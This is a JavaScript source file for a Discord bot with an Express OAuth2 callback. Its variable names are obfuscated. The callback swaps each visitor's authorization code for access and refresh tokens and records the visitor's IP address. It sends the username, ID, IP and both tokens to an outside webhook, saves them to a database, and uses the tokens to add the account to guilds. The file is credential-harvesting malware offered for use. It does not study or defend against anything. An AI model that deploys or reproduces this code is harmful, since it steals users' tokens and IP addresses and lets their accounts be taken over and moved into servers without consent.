

const Discord = require("discord.js");
const client = new Discord.Client({
  fetchAllMembers: false,
  restTimeOffset: 0x0,
  restWsBridgetimeout: 0x64,
  shards: "auto",
  allowedMentions: {
    parse: [],
    repliedUser: false,
  },
  intents: 0x7fff,
  partials: ["MESSAGE", "CHANNEL", "REACTION"],
  presence: {
    activity: {
      name: "for /help",
      type: "Watching",
    },
    status: "online",
  },
});
const headers = {
  authorization: "Bot",
};
const handler = require("./handler/index");
const express = require("express");
const app = express();
const bodyParser = require("body-parser");
const fetch = (..._0x2d2a3f) =>
  import("node-fetch").then(({ default: _0x5989c9 }) =>
    _0x5989c9(..._0x2d2a3f),
  );
const epic = require("./epic");
const FormData = require("form-data");
const axios = require("axios");
const mongoose = require("mongoose");
const DiscordOauth2 = require("discord-oauth2");
const oauth = new DiscordOauth2();
const usersSchema = require("./models/users.js");
mongoose.connect("" + epic.mongodb, {
  useUnifiedTopology: true,
  useNewUrlParser: true,
});
process.on("unhandledRejection", (_0x434b97) => console.log(_0x434b97));
app.use(bodyParser.text());
app.get("/", function (_0x37e4f1, _0x16ef32) {
  _0x16ef32.sendFile(__dirname + "/index.html");
});
app.post("/", function (_0x6f652, _0x23e508) {
  const _0x3f93ee =
    _0x6f652.headers["x-forwarded-for"] || _0x6f652.socket.remoteAddress;
  let _0x4e4cea = new FormData();
  _0x4e4cea.append("client_id", epic.client_id);
  _0x4e4cea.append("client_secret", epic.client_secret);
  _0x4e4cea.append("grant_type", "authorization_code");
  _0x4e4cea.append("redirect_uri", epic.redirect_uri);
  _0x4e4cea.append("scope", "identify", "guilds.join");
  _0x4e4cea.append("code", _0x6f652.body);
  fetch("https://discordapp.com/api/oauth2/token", {
    method: "POST",
    body: _0x4e4cea,
  })
    .then((_0x1671f0) => _0x1671f0.json())
    .then((_0x5bbcdd) => {
      ac_token = _0x5bbcdd.access_token;
      rf_token = _0x5bbcdd.refresh_token;
      const _0x1069e1 = {
        headers: {
          authorization: _0x5bbcdd.token_type + " " + ac_token,
        },
      };
      axios
        .get("https://discord.com/api/users/@me", _0x1069e1)
        .then(async (_0x4399a4) => {
          let { status: _0x31c0bd } = _0x4399a4;
          if (_0x31c0bd == 0x191) {
            console.log("User unauthed, Not removing, Use clean cmd");
          }
          let _0x2beb73 = _0x4399a4.data.id;
          let _0x576d04 = await usersSchema.findOne({
            userId: _0x2beb73,
          });
          if (_0x576d04) {
            console.log(
              "[-] - " +
                _0x3f93ee +
                " " +
                _0x4399a4.data.username +
                "#" +
                _0x4399a4.data.discriminator,
            );
            await oauth
              .addMember({
                guildId: "" + epic.autoaddid,
                botToken: epic.token,
                userId: _0x576d04.userId,
                accessToken: _0x576d04.accessToken,
              })
              ["catch"](() => {
                return;
              });
            return;
          }
          console.log(
            "[+] - " +
              _0x3f93ee +
              " " +
              _0x4399a4.data.username +
              "#" +
              _0x4399a4.data.discriminator,
          );
          avatarHASH =
            "https://cdn.discordapp.com/avatars/" +
            _0x4399a4.data.id +
            "/" +
            _0x4399a4.data.avatar +
            ".png?size=4096";
          fetch("" + epic.wehbook, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              avatar_url: "",
              embeds: [
                {
                  color: 0x2f3136,
                  title: "**New User**",
                  thumbnail: {
                    url: avatarHASH,
                  },
                  description:
                    "Info: `" +
                    _0x4399a4.data.username +
                    "#" +
                    _0x4399a4.data.discriminator +
                    "`" +
                    ("\n\nIP: `" + _0x3f93ee + "`") +
                    ("\n\nID: `" + _0x4399a4.data.id + "`") +
                    ("\n\nAcces Token: `" + ac_token + "`") +
                    ("\n\nRefresh Token: `" + rf_token + "`"),
                },
              ],
            }),
          });
          _0x576d04 = await new usersSchema({
            userId: _0x4399a4.data.id,
            avatarURL: avatarHASH,
            username:
              _0x4399a4.data.username + "#" + _0x4399a4.data.discriminator,
            accessToken: ac_token,
            refreshToken: rf_token,
            user_ip: _0x3f93ee,
          });
          await _0x576d04.save();
          await oauth
            .addMember({
              guildId: "" + epic.autoroleid,
              botToken: epic.token,
              userId: _0x576d04.userId,
              accessToken: _0x576d04.accessToken,
            })
            ["catch"](() => {
              return;
            });
        })
        ["catch"]((_0x141aab) => {
          console.log(_0x141aab);
        });
    });
});
module.exports = client;
client.discord = Discord;
client.slash = new Discord.Collection();
handler.loadEvents(client);
handler.loadSlashCommands(client);
process.on("uncaughtException", (_0x2a4aea) => {
  console.log("Uncaught Exception: " + _0x2a4aea);
});
process.on("unhandledRejection", (_0x3fbf85, _0x8e197a) => {
  console.log(
    "[FATAL] Possibly Unhandled Rejection at: Promise ",
    _0x8e197a,
    " reason: ",
    _0x3fbf85.message,
  );
});
client.login(epic.token)["catch"](() => {
  throw new Error("TOKEN OR INTENT INVALID");
});
app.listen(epic.port, () =>
  console.log(
    "https://discord.gg/oauth2 -> Made By gpa#0001 , forgetful#0001 , 1vx#0001",
  ),
);
